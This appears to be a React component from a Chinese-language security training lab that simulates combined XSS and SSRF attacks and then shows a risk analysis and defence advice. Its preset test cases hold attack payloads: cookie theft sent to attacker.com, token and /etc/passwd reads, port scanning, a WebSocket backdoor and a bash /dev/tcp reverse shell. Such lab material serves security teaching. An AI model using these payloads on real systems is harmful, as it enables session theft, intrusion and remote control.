import React, { useState, useRef, useEffect } from 'react';
import { Card, Input, Button, Space, Typography, Alert, Divider, Tag, Row, Col, Progress, Timeline, Descriptions, Badge, Steps } from 'antd';
import { LinkOutlined, ExperimentOutlined, BugOutlined, SafetyOutlined, WarningOutlined, CheckCircleOutlined, CloseCircleOutlined, ThunderboltOutlined } from '@ant-design/icons';

const { TextArea } = Input;
const { Title, Paragraph, Text } = Typography;

const CombinedAttack: React.FC = () => {
  const [xssPayload, setXssPayload] = useState('');
  const [ssrfPayload, setSsrfPayload] = useState('');
  const [targetUrl, setTargetUrl] = useState('');
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [previewKey, setPreviewKey] = useState(0);
  const previewFrameRef = useRef<HTMLIFrameElement>(null);

  const testCases = [
    {
      name: 'XSS窃取Cookie + SSRF内网探测',
      xssPayload: `<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
  .then(response => response.text())
  .then(data => {
    document.write('<img src="http://internal-server/admin?' + data + '">');
  });
</script>`,
      ssrfPayload: '{"type": "scan", "ports": [80,443,8080]}',
      targetUrl: 'http://internal-server.local',
      description: '利用XSS窃取用户Cookie，然后通过SSRF在内网进行横向移动',
      risk: 'high',
      category: '信息窃取'
    },
    {
      name: 'DOM型XSS + SSRF文件读取',
      xssPayload: `<script>
const adminToken = localStorage.getItem('admin_token');
fetch('/api/internal/read?token=' + adminToken + '&file=/etc/passwd')
  .then(r => r.text())
  .then(data => {
    document.getElementById('result').innerHTML = data;
  });
</script>`,
      ssrfPayload: '{"type": "file_read", "path": "/etc/passwd"}',
      targetUrl: 'file:///etc/passwd',
      description: '通过DOM型XSS获取管理员Token，再利用SSRF读取系统文件',
      risk: 'high',
      category: '权限提升'
    },
    {
      name: '存储型XSS + SSRF端口扫描',
      xssPayload: `<script>
function scanPort(port) {
  const img = new Image();
  img.onerror = () => {
    fetch('/api/report?port=' + port + '&status=open');
  };
  img.src = 'http://localhost:' + port + '/favicon.ico';
}
for(let p of [80,443,3306,6379]) scanPort(p);
</script>`,
      ssrfPayload: '{"type": "port_scan", "target": "localhost", "ports": [80,443,3306,6379]}',
      targetUrl: 'http://localhost',
      description: '将XSS payload持久化存储，结合SSRF进行内网端口扫描',
      risk: 'high',
      category: '网络探测'
    },
    {
      name: 'XSS蠕虫 + SSRF跨网段',
      xssPayload: `<script>
async function propagate() {
  const networks = ['192.168.1.', '10.0.0.', '172.16.0.'];
  for(let net of networks) {
    for(let i = 1; i < 10; i++) {
      await fetch('/api/scan?ip=' + net + i);
    }
  }
}
propagate();
</script>`,
      ssrfPayload: '{"type": "network_scan", "ranges": ["192.168.1.0/24", "10.0.0.0/24"]}',
      targetUrl: 'http://192.168.1.1',
      description: '通过XSS蠕虫传播，配合SSRF进行跨网段扫描',
      risk: 'critical',
      category: '蠕虫传播'
    },
    {
      name: 'XSS后门 + SSRF反弹Shell',
      xssPayload: `<script>
const ws = new WebSocket('ws://attacker.com:8080');
ws.onmessage = function(e) {
  fetch('/api/exec?cmd=' + encodeURIComponent(e.data));
};
</script>`,
      ssrfPayload: '{"type": "command", "cmd": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"}',
      targetUrl: 'http://localhost:4444',
      description: '植入XSS后门，配合SSRF执行反弹Shell',
      risk: 'critical',
      category: '远程控制'
    }
  ];

  useEffect(() => {
    updatePreview();
  }, [xssPayload, ssrfPayload, targetUrl]);

  const updatePreview = () => {
    if (previewFrameRef.current) {
      const frame = previewFrameRef.current;
      const frameDoc = frame.contentDocument || frame.contentWindow?.document;
      if (frameDoc) {
        frameDoc.open();
        frameDoc.write(`
          <!DOCTYPE html>
          <html>
            <head>
              <title>联合攻击效果预览</title>
              <style>
                body { 
                  font-family: Arial, sans-serif; 
                  padding: 20px;
                  margin: 0;
                  background-color: #f5f5f5;
                }
                .preview-content { 
                  border: 1px solid #eee;
                  padding: 15px;
                  background: white;
                  border-radius: 4px;
                  margin-bottom: 10px;
                }
                .preview-header {
                  background: #722ed1;
                  color: white;
                  padding: 10px;
                  margin: -20px -20px 20px -20px;
                  font-weight: bold;
                }
                .attack-step {
                  background: #f6ffed;
                  border: 1px solid #b7eb8f;
                  padding: 10px;
                  margin: 10px 0;
                  border-radius: 4px;
                }
                .attack-flow {
                  margin: 20px 0;
                  padding: 15px;
                  background: #f9f0ff;
                  border-radius: 4px;
                }
                pre {
                  background: #f8f9fa;
                  padding: 10px;
                  border-radius: 4px;
                  overflow-x: auto;
                }
              </style>
            </head>
            <body>
              <div class="preview-header">联合攻击链预览</div>
              <div class="preview-content">
                <div class="attack-step">
                  <h3>第一步：XSS攻击</h3>
                  <pre>${xssPayload || '未设置XSS载荷'}</pre>
                </div>
                
                <div class="attack-step">
                  <h3>第二步：SSRF攻击</h3>
                  <div>目标URL：${targetUrl || '未设置'}</div>
                  <pre>${ssrfPayload || '未设置SSRF载荷'}</pre>
                </div>

                <div class="attack-flow">
                  <h3>攻击流程图</h3>
                  <div style="text-align: center;">
                    XSS注入 → 获取信息 → SSRF请求 → 内网渗透
                  </div>
                </div>
              </div>
            </body>
          </html>
        `);
        frameDoc.close();
      }
    }
    setPreviewKey(prev => prev + 1);
  };

  const handleAttack = async () => {
    setLoading(true);
    try {
      const response = await fetch('http://localhost:5000/api/attacks/combined/simulate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ xssPayload, ssrfPayload, targetUrl }),
      });
      const data = await response.json();
      
      const enhancedData = {
        ...data,
        analysis: {
          type: getAttackType(),
          riskLevel: getRiskLevel(getPayloadRiskLevel()),
          impactScope: getImpactScope(),
          attackChain: getAttackChain(),
          preventionMethods: getPreventionMethods(),
          technicalDetails: analyzeTechnicalDetails()
        }
      };
      
      setResult(enhancedData);
    } catch (error) {
      setResult({ 
        success: false, 
        error: (error as Error).message,
        analysis: {
          type: '分析失败',
          riskLevel: { color: '#ff4d4f', percent: 0 },
          impactScope: '未知',
          attackChain: [],
          preventionMethods: ['无法分析预防方法'],
          technicalDetails: '分析过程发生错误'
        }
      });
    }
    setLoading(false);
  };

  const getAttackType = (): string => {
    if (xssPayload.includes('cookie') && ssrfPayload.includes('scan')) {
      return '信息窃取 + 内网探测';
    }
    if (xssPayload.includes('localStorage') && ssrfPayload.includes('file')) {
      return '权限提升 + 文件读取';
    }
    if (xssPayload.includes('WebSocket')) {
      return '持久化控制';
    }
    return '标准联合攻击';
  };

  const getPayloadRiskLevel = (): string => {
    if (xssPayload.includes('WebSocket') || ssrfPayload.includes('bash')) return 'critical';
    if (xssPayload.includes('cookie') || ssrfPayload.includes('scan')) return 'high';
    if (xssPayload.includes('localStorage')) return 'medium';
    return 'low';
  };

  const getImpactScope = (): string => {
    const impacts = [];
    if (xssPayload.includes('cookie')) impacts.push('用户信息泄露');
    if (ssrfPayload.includes('scan')) impacts.push('内网暴露');
    if (xssPayload.includes('WebSocket')) impacts.push('远程控制');
    if (ssrfPayload.includes('file')) impacts.push('文件系统访问');
    return impacts.join('、') || '潜在安全风险';
  };

  const getAttackChain = (): string[] => {
    const chain = ['初始XSS注入'];
    if (xssPayload.includes('cookie')) {
      chain.push('窃取用户凭证');
    }
    if (xssPayload.includes('localStorage')) {
      chain.push('获取本地存储');
    }
    if (ssrfPayload.includes('scan')) {
      chain.push('内网端口扫描');
    }
    if (ssrfPayload.includes('file')) {
      chain.push('敏感文件读取');
    }
    chain.push('攻击完成');
    return chain;
  };

  const getPreventionMethods = (): string[] => {
    const methods = [
      'CSP策略配置',
      'XSS过滤器',
      'SSRF防护',
      '网络隔离'
    ];
    if (xssPayload.includes('cookie')) {
      methods.push('HttpOnly Cookie');
    }
    if (ssrfPayload.includes('file')) {
      methods.push('文件系统访问控制');
    }
    if (xssPayload.includes('WebSocket')) {
      methods.push('WebSocket连接限制');
    }
    return methods;
  };

  const analyzeTechnicalDetails = (): string => {
    const details = [];
    if (xssPayload.includes('script')) {
      details.push('JavaScript代码注入');
    }
    if (xssPayload.includes('fetch')) {
      details.push('数据外联请求');
    }
    if (ssrfPayload.includes('scan')) {
      details.push('端口扫描尝试');
    }
    if (ssrfPayload.includes('file')) {
      details.push('文件读取尝试');
    }
    return details.join('、');
  };

  const getRiskLevel = (risk: string) => {
    switch (risk) {
      case 'critical': return { color: '#722ed1', percent: 100 };
      case 'high': return { color: '#ff4d4f', percent: 85 };
      case 'medium': return { color: '#faad14', percent: 65 };
      case 'low': return { color: '#52c41a', percent: 30 };
      default: return { color: '#1890ff', percent: 50 };
    }
  };

  return (
    <div>
      <Title level={2}>联合攻击实验</Title>
      <Paragraph>
        本实验模块用于研究XSS与SSRF漏洞的联合利用方式。通过组合两种攻击方式，
        可以实现更复杂的攻击链条，形成更大的安全威胁。请谨慎使用并仅用于安全研究。
      </Paragraph>

      <Row gutter={24}>
        <Col span={12}>
          <Card title={<><ThunderboltOutlined /> 联合攻击配置</>}>
            <Space direction="vertical" style={{ width: '100%' }}>
              <Alert
                message="安全警告"
                description="本实验涉及高风险的联合攻击测试，请确保仅在授权的测试环境中进行。"
                type="warning"
                showIcon
              />
              <Divider />
              
              <Text strong>预设测试用例：</Text>
              <Space wrap>
                {testCases.map((test, index) => (
                  <Tag
                    key={index}
                    color={getRiskLevel(test.risk).color}
                    style={{ cursor: 'pointer' }}
                    onClick={() => {
                      setXssPayload(test.xssPayload);
                      setSsrfPayload(test.ssrfPayload);
                      setTargetUrl(test.targetUrl);
                    }}
                  >
                    {test.name}
                    <Progress 
                      percent={getRiskLevel(test.risk).percent} 
                      size="small" 
                      showInfo={false}
                      strokeColor={getRiskLevel(test.risk).color}
                      style={{ width: 50, marginLeft: 10 }}
                    />
                  </Tag>
                ))}
              </Space>
              
              <Divider />
              
              <Text strong>XSS攻击载荷：</Text>
              <TextArea
                rows={4}
                value={xssPayload}
                onChange={(e) => setXssPayload(e.target.value)}
                placeholder="输入XSS攻击载荷"
              />

              <Text strong>SSRF攻击载荷：</Text>
              <TextArea
                rows={4}
                value={ssrfPayload}
                onChange={(e) => setSsrfPayload(e.target.value)}
                placeholder="输入SSRF攻击载荷（JSON格式）"
              />

              <Text strong>目标URL：</Text>
              <Input
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="输入目标URL"
              />
              
              <Button 
                type="primary" 
                onClick={handleAttack}
                loading={loading}
                icon={<ExperimentOutlined />}
                danger
              >
                执行联合攻击
              </Button>
            </Space>
          </Card>
        </Col>

        <Col span={12}>
          <Card 
            title={<><BugOutlined /> 攻击链预览</>}
            extra={
              <Button 
                type="link" 
                icon={<ExperimentOutlined />}
                onClick={updatePreview}
              >
                刷新预览
              </Button>
            }
          >
            <div style={{ marginBottom: 16 }}>
              <Alert
                message="预览区域"
                description="以下区域将显示联合攻击的执行流程和效果预览。"
                type="info"
                showIcon
              />
            </div>
            <iframe
              key={previewKey}
              ref={previewFrameRef}
              style={{
                width: '100%',
                height: '300px',
                border: '1px solid #d9d9d9',
                borderRadius: '4px'
              }}
              sandbox="allow-same-origin"
              title="联合攻击预览"
            />
          </Card>

          {result && (
            <Card 
              title={<><SafetyOutlined /> 攻击分析报告</>} 
              style={{ marginTop: 24 }}
            >
              <Space direction="vertical" style={{ width: '100%' }}>
                <Alert
                  message={result.success ? "攻击链执行成功" : "攻击链执行失败"}
                  type={result.success ? "success" : "error"}
                  showIcon
                  icon={result.success ? <CheckCircleOutlined /> : <CloseCircleOutlined />}
                />

                <Descriptions
                  title="攻击链分析"
                  bordered
                  column={1}
                  size="small"
                >
                  <Descriptions.Item label="攻击类型">
                    <Badge status={result.success ? "processing" : "default"} text={result.analysis.type} />
                  </Descriptions.Item>
                  <Descriptions.Item label="风险等级">
                    <Progress
                      percent={result.analysis.riskLevel.percent}
                      size="small"
                      status={result.success ? "active" : "exception"}
                      strokeColor={result.analysis.riskLevel.color}
                    />
                  </Descriptions.Item>
                  <Descriptions.Item label="影响范围">
                    {result.analysis.impactScope}
                  </Descriptions.Item>
                  <Descriptions.Item label="技术细节">
                    {result.analysis.technicalDetails}
                  </Descriptions.Item>
                </Descriptions>

                <Card
                  type="inner"
                  title="攻击链路"
                  size="small"
                >
                  <Steps
                    direction="vertical"
                    size="small"
                    current={result.success ? result.analysis.attackChain.length : 0}
                  >
                    {result.analysis.attackChain.map((step: string, index: number) => (
                      <Steps.Step 
                        key={index}
                        title={step}
                        status={result.success ? (index === result.analysis.attackChain.length - 1 ? "finish" : "process") : "error"}
                      />
                    ))}
                  </Steps>
                </Card>

                <Card
                  type="inner"
                  title="防护建议"
                  size="small"
                >
                  <Timeline>
                    {result.analysis.preventionMethods.map((method: string, index: number) => (
                      <Timeline.Item 
                        key={index}
                        color="blue"
                      >
                        {method}
                      </Timeline.Item>
                    ))}
                  </Timeline>
                </Card>
              </Space>
            </Card>
          )}
        </Col>
      </Row>
    </div>
  );
};

export default CombinedAttack; 